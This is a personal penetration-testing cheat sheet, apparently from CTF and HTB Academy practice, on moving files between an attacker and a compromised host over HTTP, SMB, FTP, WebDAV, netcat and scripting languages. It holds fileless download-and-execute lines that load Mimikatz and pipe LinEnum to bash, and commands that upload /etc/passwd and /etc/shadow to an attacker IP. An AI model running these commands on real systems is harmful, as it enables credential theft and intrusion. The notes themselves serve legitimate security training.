# Transfert file between target and attacking machines

> *These notes are from my practice at work, during CTF and from HTB Academy*

## Verify file integrity

- `file shell`
- `md5sum shell` and compare the result in the attacking machine and target
- `Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash` in powershell

## Method with no communications required

### Encode the file in base64

> Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

#### From Attack to target

- Get the md5sum of the file (see command above)
- Encode a file in bash `cat id_rsa |base64 -w 0;echo`
- Decode it in powershell `PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRU[STRIPPED]0tLQo="))`
- Decode it in bash (if the target is a linux machine) `echo -n 'LS0tLS1CRUdJTiBP[STREIPPED]FURSBLRVktLS0tLQo=' | base64 -d > id_rsa`
- Verify the integrity of the file with Get-FileHash on powershell (see command above)

#### From target to attack

- Get the md5sum of the file (see command above)
- Encode a file in Powershell `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
- `echo -n 'IyBDb3B5cml[STRIPPED]b3N0DQo=' | base64 -d > hosts` Decode Base64 String in Linux
- Verify the integrity of the file with Get-FileHash on powershell (see command above)

### PowerShell Web Downloads

|Method|Description|
|------|-----------|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a Stream.|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

#### PowerShell DownloadString - Fileless Method

- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`

#### PowerShell Invoke-WebRequest

> Slower

- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1` You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.

- [Powershell Download cradle by HarmJ0y](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
- `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX` Use `-UseBasicParsing` in case first launch config has not been completed in Internet Explorer.
- `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')` Bypass error SSL/TLS error.

### PowerShell Web Uploads

> PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

#### Installing a Configured WebServer with Upload

##### On your attack machine

- `pip3 install uploadserver`
- `python3 -m uploadserver`

##### In your target

- Powershell [script](https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1) to upload a file to Python Upload Server

```ps
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

- Powershell Base64 Web Upload

```ps
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

##### On your attack machine

- `nc -lvnp 8000` We catch the base64 data with Netcat
- `echo <base64> | base64 -d -w 0 > hosts` We use the base64 application with the decode option to convert the string to the file

## HTTP

### From attack machine to Target

#### Attacking machine

- In kali we can use python `python3 -m http.server 80` or `python2.7 -m SimpleHTTPServer` if python2
- `php -S 0.0.0.0:8000` with php
- `ruby -run -ehttpd . -p8000` with ruby

#### Target machine

- On a win target machine you can access it directly with the browser: `http://IP-ATTACKING-MACHINE/FILE-TO-GET` or you can use certutil.exe `certutil.exe -urlcache http://IP-ATTACKING-MACHINE/FILE-TO-GET file-to-get`
- In a linux target machine you can use `wget http://IP-ATTACKING-MACHINE/FILE-TO-GET` or curl `curl -o FILE-TO-GET http://IP-ATTACKING-MACHINE/FILE-TO-GET`
- If you want to execute the file but not download it on a linux taget `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash` or `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`
- With /dev/tcp
  - `exec 3<>/dev/tcp/10.10.10.32/80` connect to the web server
  - `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3` get the file with an http get request
  - print the resposne `cat <&3`

### Both ways

#### Updog

- Another great tool to transfer is [updog](https://github.com/sc0tfree/updog), it goes both ways if you can access a browser :D :D :D
- `pip3 install updog` easy as this to install

#### uploadserver

##### From our attack machine

- Get it [here](https://github.com/Densaugeo/uploadserver)
- `python3 -m pip install --user uploadserver` start the web server
- `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'` create a self signed certificate
- `mkdir https && cd https` start the webserver `python3 -m uploadserver 443 --server-certificate /root/server.pem`

##### From our target

- `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure` (insecure is for the self signed certificate)
- `wget 192.168.49.128:8000/filetotransfer.txt` diwload a file from the target to our attack

> Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file

## FTP

### From attack machine to target

#### Attacking machine

- `sudo pip3 install pyftpdlib`
- `python3 -m pyftpdlib -p 21 --write`

#### Target machine

- `ftp IP-OF-ATTACKING-MACHINE` we can then use `get filename` to get the file
- `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')` with powershell
- Create a Command File for the FTP Client and Download the Target File

```dos
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### From Target to attack

#### Attacking machine

- `python3 -m pyftpdlib -p 21 --write`

#### Target machine

- `ftp IP-OF-ATTACKING-MACHINE` we can then use `put filename` to send the file
- `curl --user anonymous:anonymous -o docker-toolbox.exe ftp://10.10.10.236/docker-toolbox.exe`
- `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')` with powershell
- Create a Command File for the FTP Client to Upload a File

```dos
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## SMB

### Both ways

#### Attacking machine

- In kali we can use Impacket `python3 smbserver.py -smb2support sharename /path/folder` or `sudo impacket-smbserver share -smb2support /tmp/smbshare`
- We can specify `-username user -password pass` if we need set up an authentication

#### Target machine

- In a win victim machine we just need to copy the file to the attacking machine: `copy  FiletoDownload \\IP-OF-ATTACKING-MACHINE\SHARENAME` 
- If we want to get a file to our target from the attacking machine we just need to `copy \\192.168.220.133\share\nc.exe`
- Sometimes on windows we will be asked to use a service that requires authentication so we can set this up with `net use \\<network-location>\<some-share> password /USER:username` after this we will be able to use the previous copy command

### run SMB over HTTP with WebDav

> If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot  

- `sudo pip install wsgidav cheroot`
- `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous` Using the WebDav Python module

- Connect to the Webdav share

- `dir \\192.168.49.128\DavWWWRoot` Now we can attempt to connect to the share using the DavWWWRoot directory

> Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
> You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

- Upload file using smb

```dos
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

## Metasploit

### From attack machine to Target

There is an upload and download feature

## SSH (creds needed)

### From attack machine to Target (local to remote)

- `sudo systemctl start ssh` start ssh service
- `netstat -lnpt` check ssh for listening port
- In your kali or any linux `scp FILE-TO-SEND user@ip:/path/to/folder`

> Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

### From target to attack (remote to local)

- In your kali or any linux cmd `scp user@ip:/path/to/folder FILE-TO-GET`

### Note

- If you get this error `protocol error: filename does not match request`
- You will need to add `-T` in your command. Here is an example:
- `scp -T user@server:C:\\Path\\To\\file.txt dest-folder`

## Netcat

### From Target to attack machine

#### Target machine

- `nc -lvp PORT-NUMBER > FILE-TO-SEND

#### Attacking machine

- `nc VICTIM-IP PORT-NUMBER -w 3 < FILE` note: -w is for the time out in seconds

## Evade firewall

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:  

- `base64 shell -w 0`

Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:  

- `echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ..lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

## Transfering Files with code

### Python

- `python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'` python 2
- `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'` python 3

#### Upload operations

- [Requests module](https://pypi.org/project/requests/)
- [urllib](https://docs.python.org/3/library/urllib.request.html)
- [Upload server module](https://github.com/Densaugeo/uploadserver)

- `python3 -m uploadserver` Starting the Python uploadserver Module
- `python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'` uploading a file

> Here are more details about the onliner to upload a file

```python
# To use the requests function, we need to import the module first.
import requests 
# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"
# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")
# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

> Good advice by HTB Acsademy: We can do the same with any other programming language. A good practice is picking one and trying to build an upload program.

### PHP

- [File get contents module](https://www.php.net/manual/en/function.file-get-contents.php)
- [File put contents module](https://www.php.net/manual/en/function.file-put-contents.php)
- [fopen module](https://www.php.net/manual/en/function.fopen.php)
- `php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` PHP Download with File_get_contents()
- `php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'` PHP Download with Fopen()
- `php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash` PHP Download a File and Pipe it to Bash

> Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.

### Ruby

- `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'` download a file

### Perl

- `perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'` Download a file

### Javascript

```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

- On a win cmd `cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1` Download a File Using JavaScript and cscript.exe

> Source: HTB Academy using this [post](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068)

### VBScript

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

- `cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1` Download a File Using VBScript and cscript.exe

> Source HTB Academy using this [thread](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs)

## Resources

{% embed url="https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/" %} Transfer files (Post explotation) – CheatSheet - PABLO PLAZA MARTÍNEZ {% endembed %}
